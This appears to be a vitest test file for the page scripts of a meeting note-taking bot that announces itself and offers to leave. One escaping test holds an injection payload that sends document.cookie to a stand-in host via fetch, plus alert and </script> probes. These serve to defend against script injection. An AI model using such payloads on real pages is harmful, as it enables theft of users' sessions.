import { describe, expect, it } from "vitest";

import {
  CAPTURE_HOOK_SCRIPT,
  MEETING_CHAT_OPEN_SCRIPT,
  MEETING_DRAIN_SCRIPT,
  MEETING_LEAVE_MARK_SCRIPT,
  MEETING_START_SCRIPT,
  MEETING_STATE_SCRIPT,
  MEETING_STOP_SCRIPT,
  chatPostedScript,
  chatTypeScript,
  classifyMeetPage,
  meetingAnnouncement,
  parseEvalJson,
  prepareJoinScript,
} from "./meet-scripts.ts";

const compiles = (script: string) => () => new Function(`return ${script};`);

describe("meet page scripts", () => {
  it("are valid expressions", () => {
    for (const script of [CAPTURE_HOOK_SCRIPT, MEETING_START_SCRIPT, MEETING_STOP_SCRIPT, MEETING_DRAIN_SCRIPT, MEETING_STATE_SCRIPT,
      MEETING_CHAT_OPEN_SCRIPT, MEETING_LEAVE_MARK_SCRIPT, prepareJoinScript("Ada (notes)"), chatTypeScript("hello"), chatPostedScript("hello")]) {
      expect(compiles(script)).not.toThrow();
    }
  });

  it("puts server text into a page as a JSON literal only", () => {
    const hostile = "Ada\"); fetch('https://x.test/'+document.cookie); (\"";
    const script = prepareJoinScript(hostile);
    expect(script).toContain(`const name = ${JSON.stringify(hostile)};`);
    expect(compiles(script)).not.toThrow();
    expect(compiles(chatTypeScript("`${alert(1)}` </script>"))).not.toThrow();
  });

  it("records nothing until start() is called", () => {
    expect(CAPTURE_HOOK_SCRIPT).toContain("recording: false");
    expect(CAPTURE_HOOK_SCRIPT).not.toMatch(/fetch\(|XMLHttpRequest|sendBeacon|WebSocket/);
  });
});

describe("classifyMeetPage", () => {
  it("reads the guest states", () => {
    expect(classifyMeetPage({ text: "Ready to join?", leave: false })).toBe("lobby");
    expect(classifyMeetPage({ text: "Asking to be let in...", leave: false })).toBe("waiting");
    expect(classifyMeetPage({ text: "anything", leave: true })).toBe("in-meeting");
    expect(classifyMeetPage({ text: "You left the meeting", leave: false })).toBe("ended");
    expect(classifyMeetPage({ text: "Vous avez quitté la réunion", leave: false })).toBe("ended");
    expect(classifyMeetPage({ text: "You can't join this video call", leave: false })).toBe("refused");
    expect(classifyMeetPage({ text: "Someone in the call denied your request to join", leave: false })).toBe("refused");
  });

  it("lets a refusal win even with a leave button on screen", () => {
    expect(classifyMeetPage({ text: "The host removed you from the meeting", leave: true })).toBe("refused");
  });

  it("treats junk as the lobby", () => {
    expect(classifyMeetPage({})).toBe("lobby");
    expect(classifyMeetPage({ text: 42, leave: "yes" })).toBe("lobby");
  });
});

describe("parseEvalJson", () => {
  it("reads a script's JSON string in either wrapping", () => {
    expect(parseEvalJson({ content: [{ type: "text", text: JSON.stringify(JSON.stringify({ ok: true })) }] })).toEqual({ ok: true });
    expect(parseEvalJson({ content: [{ type: "text", text: JSON.stringify({ data: { result: JSON.stringify({ ok: 1 }) } }) }] })).toEqual({ ok: 1 });
  });

  it("answers null for errors and non-objects", () => {
    expect(parseEvalJson({ isError: true, content: [{ type: "text", text: "{}" }] })).toBeNull();
    expect(parseEvalJson({ content: [{ type: "text", text: "not json" }] })).toBeNull();
    expect(parseEvalJson({ content: [{ type: "text", text: "[1]" }] })).toBeNull();
    expect(parseEvalJson(null)).toBeNull();
  });
});

describe("meetingAnnouncement", () => {
  it("names the bot, the person and how to object, in both languages", () => {
    const text = meetingAnnouncement("Ada (notes)", "Sam");
    expect(text).toContain("Ada (notes) is taking notes for Sam");
    expect(text).toContain("Dites-le ici et je quitte");
    expect(text).not.toMatch(/[\u2013\u2014]/);
  });
});
